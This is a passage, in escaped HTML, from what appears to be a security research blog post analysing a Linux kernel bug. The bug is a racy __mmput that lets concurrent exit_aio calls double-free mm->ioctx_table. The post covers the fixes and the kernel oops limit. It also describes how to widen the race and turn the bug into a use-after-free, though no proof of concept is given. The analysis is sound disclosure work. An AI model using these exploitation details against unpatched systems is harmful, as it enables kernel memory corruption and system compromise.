class=\"EakHiGVfAD-c3\"&gt;mm&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8\"&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8\"&gt;&lt;span&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj-cmLd84fS7B5_N1JRJKV3ChuYXr24FB8Yfn7ALBrmzk71O7MXZulCtaF6csA9A3021X9bEruV8iJ2aUBK2q16MfhkL5r1ofXrXEpImakAJPFNmMkeDRK1m3IAPYA3xYDOxP236HaRgDBqXsf_V9wcE9xu9sLSrNIh2hmEqbphe6CwOv7Ld9E0nv2c/s836/image3.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj-cmLd84fS7B5_N1JRJKV3ChuYXr24FB8Yfn7ALBrmzk71O7MXZulCtaF6csA9A3021X9bEruV8iJ2aUBK2q16MfhkL5r1ofXrXEpImakAJPFNmMkeDRK1m3IAPYA3xYDOxP236HaRgDBqXsf_V9wcE9xu9sLSrNIh2hmEqbphe6CwOv7Ld9E0nv2c/s836/image3.png\" border=\"0\" alt=\"Flowchart showing how mmget/mmput on a 0 refcount leads to unsafe concurrent __mmput calls.\" style=\"max-height: 750px; max-width: 600px;\"title=\"Flowchart showing how mmget/mmput on a 0 refcount leads to unsafe concurrent __mmput calls.\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c19\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8\"&gt;&lt;span&gt;This racy &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;__mmput&lt;/span&gt;&lt;span&gt;&amp;nbsp;primitive extends to its callees as well. &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;exit_aio&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&amp;nbsp;is a good candidate for taking advantage of this:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.61bc4bf6fdc2b57f4709e87c8b2c1d92281feb30\"&gt;&lt;/a&gt;&lt;a id=\"t.2\"&gt;&lt;/a&gt;&lt;table class=\"EakHiGVfAD-c16\"&gt;&lt;tr class=\"EakHiGVfAD-c21\"&gt;&lt;td class=\"EakHiGVfAD-c11\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;void&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;exit_aio&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;struct&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;mm_struct &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;*&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;struct&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;kioctx_table &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;*&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;table &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;=&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;rcu_dereference_raw&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;ioctx_table&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;struct&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;ctx_rq_wait wait&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;int&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;,&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;skipped&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;if&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(!&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;table&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;return&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; atomic_set&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;wait&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;.&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;count&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;,&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;table&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;nr&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; init_completion&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;wait&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;.&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;comp&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; skipped &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;=&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c9\"&gt;0&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;for&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;i &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;=&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c9\"&gt;0&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;table&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;nr&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;++&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;i&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;)&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;struct&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;kioctx &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;*&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;ctx &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;=&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; rcu_dereference_protected&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;table&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;table&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;[&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;i&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;],&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;true&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;if&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(!&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;ctx&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;)&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; skipped&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;++;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;continue&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ctx&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mmap_size &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;=&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c9\"&gt;0&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kill_ioctx&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;,&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;ctx&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;,&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;wait&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c1\"&gt;if&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(!&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;atomic_sub_and_test&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;skipped&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;,&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;wait&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;.&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;count&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;))&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c13\"&gt;/* Wait until all IO for the context are done. */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; wait_for_completion&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&amp;amp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;wait&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;.&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;comp&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; RCU_INIT_POINTER&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;mm&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;ioctx_table&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;,&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kfree&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;(&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c7\"&gt;table&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4\"&gt;&lt;span class=\"EakHiGVfAD-c0\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c6 EakHiGVfAD-c8\"&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8\"&gt;&lt;span&gt;While the callee function &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;kill_ioctx&lt;/span&gt;&lt;span&gt;&amp;nbsp;is written in such a way to prevent concurrent execution from causing memory corruption (part of the contract of &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c22\"&gt;&lt;a class=\"EakHiGVfAD-c101\" href=\"https://man7.org/linux/man-pages/man7/aio.7.html\"&gt;aio&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;allows for &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;kill_ioctx&lt;/span&gt;&lt;span&gt;&amp;nbsp;to be called in a concurrent way), &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;exit_aio&lt;/span&gt;&lt;span&gt;&amp;nbsp;itself makes no such guarantees. Two concurrent calls of &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;exit_aio&lt;/span&gt;&lt;span&gt;&amp;nbsp;on the same &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mm&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;struct&lt;/span&gt;&lt;span&gt;&amp;nbsp;can consequently&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;induce&lt;/span&gt;&lt;span&gt;&amp;nbsp;a double free of the &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mm-&amp;gt;ioctx_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;object, which is fetched at the beginning of the function, while only being freed at the very end. This race window can be widened substantially by creating many &lt;/span&gt;&lt;span&gt;aio&lt;/span&gt;&lt;span&gt;&amp;nbsp;contexts in order to slow down &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;exit_aio&amp;rsquo;s&lt;/span&gt;&lt;span&gt;&amp;nbsp;internal context freeing loop. Successful exploitation will trigger the following kernel &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;BUG&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&amp;nbsp;indicating that a double free has occurred:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8\"&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8\"&gt;&lt;span&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiyX2lmxdi_963UE1t88A8xenzG7zPNT8Ou2Hvspij4S2FIc_L-y1NsdEy5obGxFNaG3W8X0TpL1TubA64elOjSkJ8FAgPrrDp5B9e1dYtRiM53tlGD1eT8m_2Md9GFS_Hoye-VdLvpZfkII_Qh4eKYSaVDefbE4ttCmgrF-Hkft2ILgW2dTdcIUxgG/s1437/image2.png\" style=\"display: block; padding: 1em 0;text-align: center;\"&gt;&lt;img src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiyX2lmxdi_963UE1t88A8xenzG7zPNT8Ou2Hvspij4S2FIc_L-y1NsdEy5obGxFNaG3W8X0TpL1TubA64elOjSkJ8FAgPrrDp5B9e1dYtRiM53tlGD1eT8m_2Md9GFS_Hoye-VdLvpZfkII_Qh4eKYSaVDefbE4ttCmgrF-Hkft2ILgW2dTdcIUxgG/s1200/image2.png\" border=\"0\" alt=\"Kernel backtrace showing the double free condition detection\" style=\"max-height: 750px; max-width: 600px;\"title=\"Kernel backtrace showing the double free condition detection\" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8 EakHiGVfAD-c6\"&gt;&lt;span class=\"EakHiGVfAD-c19\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8\"&gt;&lt;span&gt;Note that as this &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;exit_aio&lt;/span&gt;&lt;span&gt;&amp;nbsp;path is hit from &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;__mmput&lt;/span&gt;&lt;span&gt;, triggering this race will produce at least two permanently deadlocked processes when those processes later try to take the mmap write lock. However, from an exploitation perspective, this is irrelevant as the memory corruption primitive has already occurred before the deadlock occurs. Exploiting the resultant primitive would probably involve racing a reclaiming allocation in between the two frees of the &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c3\"&gt;mm-&amp;gt;ioctx_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;object, then taking advantage of the resulting UAF condition of the reclaimed allocation. It is &lt;/span&gt;&lt;span&gt;undoubtedly&lt;/span&gt;&lt;span class=\"EakHiGVfAD-c5\"&gt;&amp;nbsp;possible, although I didn&amp;rsquo;t take this all the way to a completed PoC.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"EakHiGVfAD-c17 EakHiGVfAD-c8\" id=\"h.hesv56ci2m4m\"&gt;&lt;span class=\"EakHiGVfAD-c12\"&gt;Conclusion&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"EakHiGVfAD-c4 EakHiGVfAD-c8\"&gt;&lt;span&gt;While the null-dereference bug itself was &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c22\"&gt;&lt;a class=\"EakHiGVfAD-c101\" href=\"https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/fs/proc/task_mmu.c?h=v5.15.86&amp;id=33fc9e26b7cb39f0d4219c875a2451802249c225\"&gt;fixed in October 2022&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, the more important fix was the &lt;/span&gt;&lt;span class=\"EakHiGVfAD-c22\"&gt;&lt;a class=\"EakHiGVfAD-c101\" href=\"https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?h=v6.2-rc3&amp;id=48ea09cddae0b794cde2070f106ef676703dbcd3\"&gt;introduction of an oops limit&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;which causes the kernel to panic if too many oopses occur. While this patch is already upstream, it is &lt;/span&gt;&lt;span&gt;important&lt;/span&gt;&lt;span&gt;&amp;nbsp;that distributed kernels also inherit this oops limit and backport it to LTS releases if we want to avoid treating such null-dereference bugs as full-fledged security issues in the future. Even in that best-case scenario, it is nevertheless highly beneficial for security researchers to carefully evaluate the side-effects of bugs discovered in the future that are similarly 